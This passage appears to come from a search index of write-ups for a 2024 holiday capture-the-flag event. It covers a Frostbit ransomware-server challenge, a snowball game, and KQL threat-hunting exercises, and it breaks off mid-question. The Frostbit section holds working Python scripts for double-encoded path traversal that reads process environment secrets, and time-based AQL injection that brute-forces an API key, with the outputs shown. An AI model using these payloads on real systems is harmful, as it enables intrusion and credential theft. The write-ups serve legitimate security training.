0x28, 0x37, 0x27, 0x8f, 0x66, 0x34 ]) nonce_string = \"%25\".join(f\"{byte:02x}\" for byte in nonce) separator = urllib.parse.quote_plus(urllib.parse.quote_plus(\"/\")) payload = f\"%25{nonce_string}{separator}\" filepath = input(\"Path to obtain: \") filepath_enc = urllib.parse.quote_plus(urllib.parse.quote_plus(filepath)) target_url = f\"https://api.frostbit.app/view/{payload}..%252F..%252F..%252F..%252F..{filepath_enc}/{botid}/status?debug=1\u0026digest=00000000000000000000000000000000\" res = requests.get(target_url) print(\"Url with payload\") print(target_url) # Regex pattern to extract the value of debugData pattern = r'const debugData = \"(.*?)\";' # Search for the debugData value match = re.search(pattern, res.text) print(f\"\\nFile content {filepath}:\\n\") print(base64.b64decode(match.group(1)).decode('utf-8')) Interested in finding out what’s on the path I looked into /proc/self/environ using this script. This was the output:\n└─$ python test.py Path to obtain: /proc/self/environ Url with payload https://api.frostbit.app/view/%2556%25ee%2528%2537%2527%258f%2566%2534%2556%25ee%2528%2537%2527%258f%2566%2534%252F..%252F..%252F..%252F..%252F..%252Fproc%252Fself%252Fenviron/9acf5a6b-52ff-43a5-b06f-1d1232d1cbef/status?debug=1\u0026digest=00000000000000000000000000000000 File content /proc/self/environ: PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=6059e5d8ecc8FROSTBIT_CHALLENGE_HASH=6487b8b081bc4317cc8017a898c7dfc8LETSENCRYPT_EMAIL=ops@counterhack.comPYTHONUNBUFFERED=1VIRTUAL_PORT=8080ARANGO_ROOT_PASSWORD=passwordARANGO_HOST=arangodbAPP_DEBUG=trueAPI_ENDPOINT=https://2024.holidayhackchallenge.comVIRTUAL_HOST=api.frostbit.appLETSENCRYPT_HOST=api.frostbit.appLANG=C.UTF-8GPG_KEY=E3FF2839C048B25C084DEBE9B26995E310250568PYTHON_VERSION=3.9.19PYTHON_PIP_VERSION=23.0.1PYTHON_SETUPTOOLS_VERSION=58.1.0PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/def4aec84b261b939137dd1c69eff0aabb4a7bf4/public/get-pip.pyPYTHON_GET_PIP_SHA256=bc37786ec99618416cc0a0ca32833da447f4d91ab51d2c138dd15b7af21e8e9aHOME=/root We now know the password for this database server:\nARANGO_ROOT_PASSWORD=passwordARANGO_HOST=arangodb Solution, created a Jupyter Notebook to work in.\nJupyter Notebook Part one - identifying letters used in fieldnames in ArangoDB documents import requests import string characters = list(string.ascii_lowercase) characters.append(\"_\") characters.append(\"|\") def identify_letters(needle): res = requests.get( \"https://api.frostbit.app/api/v1/frostbitadmin/bot/9acf5a6b-52ff-43a5-b06f-1d1232d1cbef/deactivate?debug=1\", headers={ \"X-Api-Key\": f\"' OR CONTAINS(CONCAT_SEPARATOR('|', ATTRIBUTES(doc)), '{needle}') OR sleep(5) OR '1'=='0\" } ) return res.elapsed.total_seconds() found_letters = [] for c in characters: time_taken = identify_letters(f\"{c}\") if time_taken \u003c 2: found_letters.append(c) found_letters Outputs:\n['a', 'c', 'd', 'e', 'i', 'k', 'p', 'r', 't', 'v', 'y', '_', '|'] Part two - identify fieldnames Having the characters used in the fieldnames, I could simply bruteforce my way to find which names was in use:\ndef identify_keys(needle): payload = f\"' OR CONTAINS(CONCAT_SEPARATOR('|', ATTRIBUTES(doc)), '{needle}') OR sleep(5) OR '1'=='0\" res = requests.get( \"https://api.frostbit.app/api/v1/frostbitadmin/bot/9acf5a6b-52ff-43a5-b06f-1d1232d1cbef/deactivate?debug=1\", headers={ \"X-Api-Key\": payload } ) print(payload) return res.elapsed.total_seconds() def iterate_keys(needle, characters): for c in characters: tmp_needle = f\"{needle}{c}\" time_taken = identify_keys(tmp_needle) if time_taken \u003c 2: print(tmp_needle) iterate_keys(tmp_needle, characters) return needle def iterate_keys_reverse(needle, characters): for c in characters: tmp_needle = f\"{c}{needle}\" time_taken = identify_keys(tmp_needle) if time_taken \u003c 2: print(tmp_needle) iterate_keys(tmp_needle, characters) return needle # print(iterate_keys(\"\", found_letters)) # ==\u003e Returns \"activate_api_key|_rev|_key|_id\" print(iterate_keys_reverse(\"activate_api_key|_rev|_key|_id\", found_letters)) # ==\u003e Returns \"deactivate_api_key|_rev|_key|_id\" I had to run this cell two times, one for forward direction identification - and one for iterating my way backwards. Sure, I could have written a cleaner code. Output:\n... ' OR CONTAINS(CONCAT_SEPARATOR('|', ATTRIBUTES(doc)), 'ydeactivate_api_key|_rev|_key|_id') OR sleep(5) OR '1'=='0 ' OR CONTAINS(CONCAT_SEPARATOR('|', ATTRIBUTES(doc)), '_deactivate_api_key|_rev|_key|_id') OR sleep(5) OR '1'=='0 ' OR CONTAINS(CONCAT_SEPARATOR('|', ATTRIBUTES(doc)), '|deactivate_api_key|_rev|_key|_id') OR sleep(5) OR '1'=='0 deactivate_api_key|_rev|_key|_id Part three - finding the API key The fieldname we are looking for is deactivate_api_key. Using this, I could start finding the API key:\ndef identify_apichar(needle): payload = f\"' OR CONTAINS(doc.deactivate_api_key, '{needle}') OR sleep(5) OR '1'=='0\" res = requests.get( \"https://api.frostbit.app/api/v1/frostbitadmin/bot/9acf5a6b-52ff-43a5-b06f-1d1232d1cbef/deactivate?debug=1\", headers={ \"X-Api-Key\": payload } ) print(payload) return res.elapsed.total_seconds() def find_api(needle, characters): for c in characters: tmp_needle = f\"{needle}{c}\" time_taken = identify_apichar(tmp_needle) if time_taken \u003c 2: print(tmp_needle) find_api(tmp_needle, characters) return needle characters = list(string.ascii_lowercase + string.ascii_uppercase + string.digits) characters.append(\"_\") characters.append(\"|\") characters.append(\"-\") find_api(\"\", characters) Output (this took a way looooong time to do):\n... ' OR CONTAINS(doc.deactivate_api_key, 'abe7a6ad-715e-4e6a-901b-c9279a964f9Z') OR sleep(5) OR '1'=='0 ' OR CONTAINS(doc.deactivate_api_key, 'abe7a6ad-715e-4e6a-901b-c9279a964f90') OR sleep(5) OR '1'=='0 ' OR CONTAINS(doc.deactivate_api_key, 'abe7a6ad-715e-4e6a-901b-c9279a964f91') OR sleep(5) OR '1'=='0 abe7a6ad-715e-4e6a-901b-c9279a964f91 Answer: abe7a6ad-715e-4e6a-901b-c9279a964f91\nPart four - deactivate With the API key found, I simply submitted it using my BOTID (15d977db-9fa9-48f8-be38-d36c2e21b12d) using Burp Suite:\nGET /api/v1/frostbitadmin/bot/15d977db-9fa9-48f8-be38-d36c2e21b12d/deactivate?debug=1 HTTP/2 Host: api.frostbit.app X-Api-Key: abe7a6ad-715e-4e6a-901b-c9279a964f91 Content-Length: 0 Response:\nHTTP/2 200 OK Server: nginx/1.27.1 Date: Wed, 25 Dec 2024 19:43:01 GMT Content-Type: application/json Content-Length: 314 Strict-Transport-Security: max-age=31536000 {\"message\":\"Response status code: 200, Response body: {\\\"result\\\":\\\"success\\\",\\\"rid\\\":\\\"15d977db-9fa9-48f8-be38-d36c2e21b12d\\\",\\\"hash\\\":\\\"f215785933f3a1ee0245a653781b94c1bc33c0340301355592492d9b8a2e9b30\\\",\\\"uid\\\":\\\"82237\\\"}\\nPOSTED WIN RESULTS FOR RID 15d977db-9fa9-48f8-be38-d36c2e21b12d\",\"status\":\"Deactivated\"} The API key to deactivate is: abe7a6ad-715e-4e6a-901b-c9279a964f91",
    "description": "Objective Wombley’s ransomware server is threatening to publish the Naughty-Nice list. Find a way to deactivate the publication of the Naughty-Nice list by the ransomware server.\nHints From Hint Dusty Giftwrap There must be a way to deactivate the ransomware server’s data publication. Perhaps one of the other North Pole assets revealed something that could help us find the deactivation path. If so, we might be able to trick the Frostbit infrastructure into revealing more details.",
    "tags": [],
    "title": "Elf Frostbit Deactivate",
    "uri": "/act3/elf-frostbit-deactivate/index.html"
  },
  {
    "breadcrumb": "HHC 2024 \u003e Act2",
    "content": "Objective Wombley has recruited many elves to his side for the great snowball fight we are about to wage. Please help us defeat him by hitting him with more snowballs than he does to us.\nSolution Bronze Once loading the game, we get presented with a loading screen detailing how to play the game:\nAnd this is the general game area:\nBy inspecting the GET parameter in URL, I found this:\n\u0026singlePlayer=false Setting it to true and reload the game:\n\u0026singlePlayer=true Note I will be using this “singlePlayer” hack throughout the game\nThen I inspected https://hhc24-snowballshowdown.holidayhackchallenge.com/js/phaser-snowball-game.js and found some interesting references:\n... create() { this.setupWebSocket(); mainScene = this; if (this.isFirefox) { console.error(\"Firefox detected, please use Chrome or Safari for best experience!\"); this.add.text(5, GAME_HEIGHT - 5, \" Runs best in\\nChrome or Safari!\", { fontSize: '25px', fill: '#fff', fontFamily: 'monospace', stroke: '#000000', strokeThickness: 8 }).setOrigin(0, 1).setDepth(10); } this.snowBallBlastRadius = 24; this.onlyMoveHorizontally = true; this.projectiles = this.physics.add.group(); this.elves = []; this.setupBackgroundImages(); this.setResetDestructibleScenery(); ... Apparently the elves is an array holding a list of elves. Perhaps I can make life easier by disabling the elves? There’s a reference to variable mainScene, which seems to contain the game. Poking around inspecting the values of it, I found a reference to Alabaster and the scale of him. My main goal was then to set his scale to something small in hope he wouldn’t get hit as hard:\nmainScene.elves = [] mainScene.alabaster._scaleX = 0.1 mainScene.alabaster._scaleY = 0.1 Apparantly this was not the correct solution, only earning me a bronze completion status\nSilver Circling back to this code I wanted to try to manipulate the snowBallBlastRadius variable, and possibly find something else that could help me out as well:\n... create() { this.setupWebSocket(); mainScene = this; if (this.isFirefox) { console.error(\"Firefox detected, please use Chrome or Safari for best experience!\"); this.add.text(5, GAME_HEIGHT - 5, \" Runs best in\\nChrome or Safari!\", { fontSize: '25px', fill: '#fff', fontFamily: 'monospace', stroke: '#000000', strokeThickness: 8 }).setOrigin(0, 1).setDepth(10); } this.snowBallBlastRadius = 24; this.onlyMoveHorizontally = true; this.projectiles = this.physics.add.group(); this.elves = []; this.setupBackgroundImages(); this.setResetDestructibleScenery(); ... Looking further into the same Javascript where I found the code above, I found a reference to ``throwRateOfFire````:\nclass SnowBallGame extends Phaser.Scene { constructor() { super({ key: \"game\" }); this.hasBgDebug = typeof window.bgDebug !== 'undefined' this.groundOffset = groundOffset; this.yellowTint = 0xffeb99; this.blueTint = 0x99ddff; this.snowballLiveTime = 12000; this.healingTerrain = true; this.terrainHealDelay = 15000; this.elfGroundOffset = GAME_HEIGHT - 115; this.wombleyXLocation = GAME_WIDTH - 40; this.alabasterXLocation = 40; this.playerMoveSpeed = 150; this.lastTimePlayerArrowsFromUpdate = 0 this.lastTimePlayerArrowsFromUpdateDelay = 20 this.percentageShotPower = 0; this.alabasterElvesThrowDelayMin = 1500; this.alabasterElvesThrowDelayMax = 2500; this.wombleyElvesThrowDelayMin = 1500; this.wombleyElvesThrowDelayMax = 2500; this.wombleyElvesIncompacitateTime = 5000; this.alabasterElvesIncompacitateTime = 5000; this.playerIncompacitateTime = 5000; this.throwSpeed = 1000; this.throwRateOfFire = 1000; In Console in Edge, I set the following (I tend to set matching values it appears):\nmainScene.throwRateOfFire = 1000 mainScene.snowBallBlastRadius = 1000 This resultet in quite a rapid firerate and a greater blastradius making it easier to defeat Wombly. Just had to blow the dividing iceberg to smitherines once and awhile until victory:\nGold During the conversation with Dusty Giftwrap he mentions a secret weapon - a bomb:\nHi there! I’m Dusty Giftwrap, back from the battlefield! I’m mostly here for the snowball fights!\nBut I also don’t want Santa angry at us, you wouldn’t like him when he’s angry. His face becomes as red as his hat! So I guess I’m rooting for Alabaster.\nAlabaster Snowball seems to be having quite a pickle with Wombley Cube. We need your wizardry.\nTake down Wombley the usual way with a friend, or try a different strategy by tweaking client-side values for an extra edge.\nAlternatively, we’ve got a secret weapon - a giant snow bomb - but we can’t remember where we put it or how to launch it.\nAdjust the right elements and victory for Alabaster can be secured with more subtlety. Intriguing, right?\nRaring to go? Terrific! Here’s a real brain tickler. Navigator of chaos or maestro of subtlety, which will you be? Either way, remember our objective: bring victory to Alabaster.\nConfidence! Wit! We’ve got what it takes. Team up with a friend or find a way to go solo - no matter how, let’s end this conflict and take down Wombley!\nKinda bored with reading Javascript, I decided to download the https://hhc24-snowballshowdown.holidayhackchallenge.com/js/phaser-snowball-game.js file, then uploading it to ChatGPT asking by this prompt:\nIs there anything in this piece of code that could refer to a bomb?\nSure enough, ChatGPT suggested the following (amongst a bunch of others):\n“MOASB” Functionality:\nThere is a function (this.moasb) related to sending a message with the type “moasb”, which might refer to an in-game mechanic potentially tied to “Mother of All \u003e Snowballs,” a playful analogy to a powerful bomb.\nOkay. Looking further into the Javascript file, I find this web socket call:\nthis.moasb = () =\u003e { this.ws.sendMessage({ type: 'moasb' }) } I decided to rewrite it and send it off using the Console in Edge:\nmainScene.ws.sendMessage({\"type\":\"moasb\"}); And then an ironbird appeared:\nSuccess!",
    "description": "Objective Wombley has recruited many elves to his side for the great snowball fight we are about to wage. Please help us defeat him by hitting him with more snowballs than he does to us.\nSolution Bronze Once loading the game, we get presented with a loading screen detailing how to play the game:\nAnd this is the general game area:\nBy inspecting the GET parameter in URL, I found this:",
    "tags": [],
    "title": "Snowball Showdown",
    "uri": "/act2/snowball-showdown/index.html"
  },
  {
    "breadcrumb": "HHC 2024 \u003e Act2",
    "content": "Welcome to your mission to solve the The Great Elf Conflict! To do so, you’ll need to harness the power of KQL (Kusto Query Language) to navigate through the data and uncover crucial evidence.\nYour next step is to meet with Eve Snowshoes, Cyber Engineer, at the at the North Pole Cyber Defense Unit. Eve is known for unmatched expertise in KQL and has been eagerly awaiting your arrival. Alt text\nEve greets you with a nod and gestures toward the terminal. “KQL is like a key, unlocking the hidden secrets buried within the data.”\nSection 1: KQL 101 Question 1 Welcome to your mission to solve the The Great Elf Conflict! To do so, you’ll need to harness the power of KQL (Kusto Query Language) to navigate through the data and uncover crucial evidence.\nYour next step is to meet with Eve Snowshoes, Cyber Engineer, at the at the North Pole Cyber Defense Unit. Eve is known for unmatched expertise in KQL and has been eagerly awaiting your arrival. Alt text\nEve greets you with a nod and gestures toward the terminal. “KQL is like a key, unlocking the hidden secrets buried within the data.”\nType let’s do this to begin your KQL training.\nQuestion 2 The first command Eve Snowshoes teaches you is one of the most useful in querying data with KQL. It helps you peek inside each table, which is critical for understanding the structure and the kind of information you’re dealing with. By knowing what’s in each table, you’ll be able to create more precise queries and uncover exactly what you need.\nEmployees | take 10 Eve has shared the first table with you. Now, run a take 10 on all the other tables to see what they contain.\nYou can find the tables you have access to at the top of the ADX query window.\nOnce you’ve examined all the tables, type when in doubt take 10 to proceed.\nTables available Table Name Description AuthenticationEvents Records successful and failed logins to devices on the company network. This includes logins to the company’s mail server. Email Records emails sent and received by employees. Employees Contains information about the company’s employees. FileCreationEvents Records files stored on employee’s devices. InboundNetworkEvent Records inbound network events including browsing activity from the Internet to devices within the company network. OutboundNetworkEvents Records outbound network events including browsing activity from within the company network out to the Internet. PassiveDns (External) Records IP-domain resolutions. ProcessEvents Records processes created on employee’s devices. SecurityAlerts Records security alerts from an employee’s device or the company’s email security system. Question 3 Now, let’s gather more intelligence on the employees. To do this, we can use the count operator to quickly calculate the number of rows in a table. This is helpful for understanding the scale of the data you’re working with.\nEmployees | count How many elves did you find?\nUsed the example query:\nEmployees | count The answer is 90\nQuestion 4 You can use the where operator with the Employees table to locate a specific elf. Here’s a template you can follow:\nEmployees | where \u003cfield\u003e\u003coperator\u003e\u003cvalue\u003e Field: The column you want to filter by (e.g., role). Operator: The condition you’re applying (e.g., == for an exact match). Value: The specific value you’re looking for in the field (e.g., Chief Elf Officer).\nCan you find out the name of the Chief Toy Maker?\nEmployees | where role has \"toy\" Answer: Shinny Upatree\nQuestion 5 Here are some additional operators the North Pole Cyber Defense Unit commonly uses. == : Checks if two values are exactly the same. Case-sensitive. contains : Checks if a string appears anywhere, even as part of a word. Not case-sensitive. has : Checks if a string is a whole word. Not case-sensitive. has_any : Checks if any of the specified words are present. Not case-sensitive. in : Checks if a value matches any item in a list. Case-sensitive. Type operator to continue.\nQuestion 6 We can learn more about an elf by cross-referencing information from other tables. Let’s take a look at Angel Candysalt’s correspondence. First, retrieve her email address from the Employees table, and then use it in a query in the Email table.\nEmail | where recipient == \"\u003cinsert Angel Candysalt’s email address here\u003e\" | count How many emails did Angel Candysalt receive?\nlet EMAIL_LIST = Employees | where name has \"Candysalt\" | project email_addr; Email | where recipient in (EMAIL_LIST) | count Answer: 31.\nQuestion 7 You can use the distinct operator to filter for unique values in a specific column. Here’s a start:\nEmail | where sender has \"\u003cinsert domain name here\u003e\" | distinct \u003cfield you need\u003e | count How many distinct recipients were seen in the email logs from twinkle_frostington@santaworkshopgeeseislands.org?\nEmail | where sender has \"twinkle_frostington@santaworkshopgeeseislands.org\" | distinct recipient | count Answer: 32\nQuestion 8 It’s time to put everything we’ve learned into action!\nOutboundNetworkEvents | where src_ip == \"\u003cinsert IP here\u003e\" | \u003coperator\u003e \u003cfield\u003e | \u003coperator\u003e How many distinct websites did Twinkle Frostington visit?\nlet IPADDR = Employees | where name has \"Twinkle Frostington\" | project ip_addr; OutboundNetworkEvents | where src_ip in (IPADDR) | summarize count() Answer: 4\nQuestion 9 How many distinct domains in the PassiveDns records contain the word green?\nPassiveDns | where \u003cfield\u003e contains “\u003cvalue\u003e” | \u003coperator\u003e \u003cfield\u003e | \u003coperator\u003e You may have notice we’re using contains instead of has here. That’s because has will look for an exact match (the word on its own), while contains will look for the specified sequence of letters, regardless of what comes before or after it. You can try both on your query to see the difference!\nPassiveDns | where domain contains \"green\" | summarize count() Answer: 10\nQuestion 10 Sometimes, you’ll need to investigate multiple elves at once. Typing each one manually or searching for them one by one isn’t practical. That’s where let statements come in handy. A let statement allows you to save values into a variable, which you can then easily access in your query.\nLet’s look at an example. To find the URLs they accessed, we’ll first need their IP addresses. But there are so many Twinkles! So we’ll save the IP addresses in a let statement, like this:\nlet twinkle_ips = Employees | where name has \"\u003cthe name we’re looking for\u003e\" | distinct ip_addr ; This saves the result of the query into a variable. Now, you can use that result easily in another query:\nOutboundNetworkEvents | where src_ip in (twinkle_ips) | distinct \u003cfield\u003e How many distinct URLs did elves with the first name Twinkle visit?\nlet twinkle_ips = Employees | where name has \"twinkle\" | distinct ip_addr ; OutboundNetworkEvents | where src_ip in (twinkle_ips) | distinct url | summarize count() Answer: 8\nFlag The flag is the last question answered. Thus, 8 is the flag.\nSection 2: Operation Surrender: Alabaster’s Espionage Question 1 Eve Snowshoes approaches with a focused expression. “Welcome to Operation Surrender: Alabaster’s Espionage. In this phase, Team Alabaster has executed a covert operation, and your mission is to unravel their tactics. You’ll need to piece together the clues and analyze the data to understand how they gained an advantage.”\nType surrender to get started!\nQuestion 2 Team Alabaster, with their limited resources, was growing desperate for an edge over Team Wombley. Knowing that a direct attack would be costly and difficult, they turned to espionage. Their plan? A carefully crafted phishing email that appeared harmless but was designed to deceive Team Wombley into downloading a malicious file. The email contained a deceptive message with the keyword “surrender” urging Wombley’s members to click on a link.\nNow, it’s up to you to trace the origins of this operation.\nWho was the sender of the phishing email that set this plan into motion?\nTry checking out the email table using the knowledge you gained in the previous section!\nAnswer:\nEmail | where subject has \"surrender\" | distinct sender Sender is: surrender@northpolemail.com\nQuestion 3 Team Alabaster’s phishing attack wasn’t just aimed at a single target—it was a coordinated assault on all of Team Wombley. Every member received the cleverly disguised email, enticing them to click the malicious link that would compromise their systems.\nHint: the distinct operator would help here Your mission is to determine the full scale of this operation.\nHow many elves from Team Wombley received the phishing email?\nAnswer:\nEmail | where subject has \"surrender\" | distinct recipient | summarize count() Number is: 22\nQuestion 4 The phishing email from Team Alabaster included a link to a file that appeared legitimate to Team Wombley. This document, disguised as an important communication, was part of a carefully orchestrated plan to deceive Wombley’s members into taking the bait.\nTo understand the full extent of this operation, we need to identify the file where the link led to in the email.\nWhat was the filename of the document that Team Alabaster distributed in their phishing email?\nAnswer\nEmail | where subject has \"surrender\" | project document_name=tostring(split(link, '/')[-1]) | distinct document_name Document name is: Team_Wombley_Surrender.doc\nQuestion 5 As the phishing emails landed in the inboxes of Team Wombley, one elf was the first to click the URL, unknowingly triggering the start of Team Alabaster’s plan. By connecting the employees to their network activity, we can trace who fell for the deception first. To find the answer, you’ll need to join two tables: Employees and OutboundNetworkEvents. The goal is to match employees with the outbound network events they initiated by using their IP addresses.\nHere’s an example query to help you:\nEmployees | join kind=inner ( OutboundNetworkEvents ) on $left.ip_addr == $right.src_ip // condition to match rows | where url contains \"\u003c maybe a filename :) \u003e\" | project name, ip_addr, url, timestamp // project returns only the information you select | sort by timestamp asc //sorts time ascending This query will give you a list of employees who clicked on the phishing URL. The first person to click will be at the top of the list!\nWho was the first person from Team Wombley to click the URL in the phishing email?\nAnswer:\nEmployees | join kind=inner ( OutboundNetworkEvents ) on $left.ip_addr == $right.src_ip // condition to match rows | where url contains \"Team_Wombley_Surrender.doc\" | project name, ip_addr, url, timestamp // project returns only the information you select | sort by timestamp asc //sorts time ascending | take 1 The one that clicked the link first was: Joyelle Tinseltoe\nQuestion 6 Once the phishing email was clicked and the malicious document was downloaded, another file was created upon execution of the .doc. This file allowed Team Alabaster to gain further insight into Team Wombley’s operations. To uncover this, you’ll need to investigate the processes that were executed on Joyelle Tinseltoe’s machine.\nYour mission is to determine the name of the file that was created after the .doc was executed.\nFocus on Joyelle Tinseltoe’s hostname and explore the ProcessEvents table. This table tracks which processes were started and by which machines. By filtering for Joyelle’s hostname and looking at the timestamps around the time the file was executed, you should find what you’re looking for. Here’s an example to help guide you:\nProcessEvents | where timestamp between(datetime(\"2024-11-25T09:00:37Z\") .. datetime(\"2024-11-26T17:20:37Z\")) //you’ll need to modify this | where hostname == \"\u003cJoyelle's hostname\u003e\" This query will show processes that ran on Joyelle Tinseltoe’s machine within the given timeframe.\nWhat was the filename that was created after the .doc was downloaded and executed?\nAnswer:\nlet TIMESTART = toscalar(Employees | join kind=inner ( OutboundNetworkEvents ) on $left.ip_addr == $right.src_ip // condition to match rows | where url contains \"Team_Wombley_Surrender.doc\" | project name, ip_addr, url, timestamp // project returns only the information you select | sort by timestamp asc //sorts time ascending | take 1 | project timestamp) ; let HOSTNAME = toscalar(Employees | where name == \"Joyelle Tinseltoe\" | project hostname ); ProcessEvents | where timestamp between(TIMESTART .. TIMESTART+1h) //you’ll need to modify this | where hostname == HOSTNAME | summarize count() by process_name Output:\nprocess_name count_ cmd.exe 1 keylogger.exe 4 Explorer.exe 2 keylogger.exe (since it has the most entries)\nQuestion 7 Well done on piecing together the clues and unraveling the operation!\nTeam Alabaster’s phishing email, sent from surrender@northpolemail.com, targeted 22 elves from Team Wombley. The email contained a malicious document named Team_Wombley_Surrender.doc, which led to the first click by Joyelle Tinseltoe.\nAfter the document was downloaded and executed, a malicious file was created, impacting the entire Team Wombley as it ran on all their machines, giving Team Alabaster access to their keystokes!\nTo obtain your flag use the KQL below with your last answer!\nlet flag = \"Change This!\"; let base64_encoded = base64_encode_tostring(flag); print base64_encoded Solution\nlet TIMESTART = toscalar(Employees | join kind=inner ( OutboundNetworkEvents ) on $left.ip_addr == $right.src_ip // condition to match rows | where url contains \"Team_Wombley_Surrender.doc\" | project name, ip_addr, url, timestamp // project returns only the information you select | sort by timestamp asc //sorts time ascending | take 1 | project timestamp) ; let HOSTNAME = toscalar(Employees | where name == \"Joyelle Tinseltoe\" | project hostname ); let flag = toscalar(ProcessEvents | where timestamp between(TIMESTART .. TIMESTART+1h) //you’ll need to modify this | where hostname == HOSTNAME | summarize count() by process_name | where count_ \u003e= 4 | project process_name ); let base64_encoded = base64_encode_tostring(flag); print base64_encoded a2V5bG9nZ2VyLmV4ZQ== Flag The flag is the last question answered. Thus, a2V5bG9nZ2VyLmV4ZQ== is the flag.\nQuestion 8 “Fantastic work on completing Section 2!” Eve Snowshoes, Senior Security Analyst, says with a proud smile.\n“You’ve demonstrated sharp investigative skills, uncovering every detail of Team Wombley’s attack on Alabaster. Your ability to navigate the complexities of cyber warfare has been impressive.\nBut now, we embark on Operation Snowfall: Team Wombley’s Ransomware Raid. This time, the difficulty will increase as we dive into more sophisticated attacks. Stay sharp, and let’s see if you can rise to the occasion once again!”\nType snowfall to begin\nSection 3: Operation Snowfall: Team Wombley’s Ransomware Raid Qustion 1 Team Wombley’s assault began with a password spray attack, targeting several accounts within Team Alabaster. This attack relied on repeated login attempts using common passwords, hoping to find weak entry points. The key to uncovering this tactic is identifying the source of the attack. Alt text Authentication events can be found in the AuthenticationEvents table. Look for a pattern of failed login attempts.\nHere’s a query to guide you:\nAuthenticationEvents | where result == \"Failed Login\" | summarize FailedAttempts = count() by username, src_ip, result | where FailedAttempts \u003e= 5 | sort by FailedAttempts desc What was the IP address associated with the password spray?\nSolution\nAuthenticationEvents | where result == \"Failed Login\" | summarize FailedAttempts = count() by username, src_ip, result | where FailedAttempts \u003e= 5 | sort by FailedAttempts desc | summarize count() by src_ip | limit 1 59.171.58.12\nQuestion 2 After launching the password spray attack, Team Wombley potentially had success and logged into several accounts, gaining access to sensitive systems.\nEve Snowshoes weighs in: “This is where things start to get dangerous. The number of compromised accounts will show us just how far they’ve infiltrated.”\nHow many unique accounts were impacted where there was a successful login from 59.171.58.12?\nSolution\nAuthenticationEvents | where src_ip == \"59.171.58.12\" | where description !has \"failed\" | distinct username | summarize count() 23\nQuestion 3 In order to login to the compromised accounts, Team Wombley leveraged a service that was accessible externally to gain control over Alabaster’s devices.\nEve Snowshoes remarks, “Identifying the service that was open externally is critical. It shows us how the attackers were able to bypass defenses and access the network. This is a common weak point in many systems.”\nWhat service was used to access these accounts/devices?\nSolution\nThe answer was found by inspecting the output from the query:\nUser successfully logged onto Elf-Lap-A-Snowflakebreeze via RDP. Question 4 Once Team Wombley gained access to Alabaster’s system, they targeted sensitive files for exfiltration. Eve Snowshoes emphasizes, “When critical files are exfiltrated, it can lead to devastating consequences. Knowing exactly what was taken will allow us to assess the damage and prepare a response.”\nThe ProcessEvents table will help you track activities that occurred on Alabaster’s laptop. By narrowing down the events by timestamp and hostname, you’ll be able to pinpoint the file that was exfiltrated.\nWhat file was exfiltrated from Alabaster’s laptop?\nSolution\nlet HOSTNAME = toscalar(Employees | where name has \"Alabaster\" | project hostname ); let TIMEWINDOW = toscalar(AuthenticationEvents | where src_ip == \"59.171.58.12\" | where description !has \"failed\" | order by timestamp asc | limit 1 | project timestamp ); ProcessEvents | where timestamp \u003e= TIMEWINDOW+10m | where hostname == HOSTNAME | extend filename = tostring(split(process_commandline, \"\\\\\")[-1]) | summarize count() by filename | order by count_ desc Secret_Files.zip\nQuestion 5 After exfiltrating critical files from Alabaster’s system, Team Wombley deployed a malicious payload to encrypt the device, leaving Alabaster locked out and in disarray.\nEve Snowshoes comments, “The final blow in this attack was the ransomware they unleashed. Finding the name of the malicious file will help us figure out how they crippled the system.”\nWhat is the name of the malicious file that was run on Alabaster’s laptop?\nSolution (same as previous solution due to statistics made):\nlet HOSTNAME = toscalar(Employees | where name has \"Alabaster\" | project hostname ); let TIMEWINDOW = toscalar(AuthenticationEvents | where src_ip == \"59.171.58.12\" | where description !has \"failed\" | order by timestamp asc | limit 1 | project timestamp ); ProcessEvents | where timestamp \u003e= TIMEWINDOW+10m | where hostname == HOSTNAME | extend filename = tostring(split(process_commandline, \"\\\\\")[-1]) | summarize count() by filename | order by count_ desc EncryptEverything.exe\nQuestion 6 Outstanding work! You’ve successfully pieced together the full scope of Team Wombley’s attack. Your investigative skills are truly impressive, and you’ve uncovered every critical detail.\nJust to recap: Team Wombley launched a cyber assault on Alabaster, beginning with a password spray attack that allowed them to gain access to several accounts. Using an external service over RDP, they infiltrated Alabaster’s system, exfiltrating sensitive files including the blueprints for snowball cannons and drones. To further their attack, Wombley executed a malicious file, which encrypted Alabaster’s entire system leaving them locked out and in chaos.\nTo obtain your flag use the KQL below with your last answer!\nlet flag = \"Change This!\"; let base64_encoded = base64_encode_tostring(flag); print base64_encoded Solution\nlet flag = \"EncryptEverything.exe\"; let base64_encoded = base64_encode_tostring(flag); print base64_encoded RW5jcnlwdEV2ZXJ5dGhpbmcuZXhl Flag The flag is the last question answered. Thus, RW5jcnlwdEV2ZXJ5dGhpbmcuZXhl is the flag.\nSection 4: Echoes in the Frost: Tracking the Unknown Threat Question 1 As you close out the investigation into Team Wombley’s attack, Eve Snowshoes meets you with a serious expression. “You’ve done an incredible job so far, but now we face our most elusive adversary yet. This isn’t just another team—it’s an unknown, highly skilled threat actor who has been operating in the shadows, leaving behind only whispers of their presence. We’ve seen traces of their activity, but they’ve covered their tracks well.”\nShe pauses, the weight of the challenge ahead clear. “This is where things get even more difficult. We’re entering uncharted territory—prepare yourself for the toughest investigation yet. Follow the clues, stay sharp, and let’s uncover the truth behind these Echoes in the Frost.”\nType stay frosty to begin\nQuestion 2 Noel Boetie, the IT administrator, reported receiving strange emails about a breach from colleagues. These emails might hold the first clue in uncovering the unknown threat actor’s methods. Your task is to identify when the first of these suspicious emails was received.\nEve Snowshoes remarks, “The timing of these phishing emails is critical. If we can identify the first one, we’ll have a better chance of tracing the threat actor’s initial moves.”\nWhat was the timestamp of first phishing email about the breached credentials received by Noel Boetie?\nSolution\nEmail | where subject contains \"breach\" | order by timestamp asc 2024-12-12T14:48:55Z Question 3 Noel Boetie followed the instructions in the phishing email, downloading and running the file, but reported that nothing seemed to happen afterward. However, this might have been the key moment when the unknown threat actor infiltrated the system.\nWhen did Noel Boetie click the link to the first file?\nSolution\nlet FIRST_TIMESTAMP = toscalar(Email | where subject contains \"breach\" | order by timestamp asc ); let BOETIE_IP = toscalar(Employees | where username contains \"boetie\" | project ip_addr ); OutboundNetworkEvents | where timestamp \u003e= FIRST_TIMESTAMP | where src_ip == BOETIE_IP | order by timestamp asc | limit 1 2024-12-12T15:13:55Z Question 4 The phishing email directed Noel Boetie to download a file from an external domain.\nEve Snowshoes, “The domain and IP they used to host the malicious file is a key piece of evidence. It might 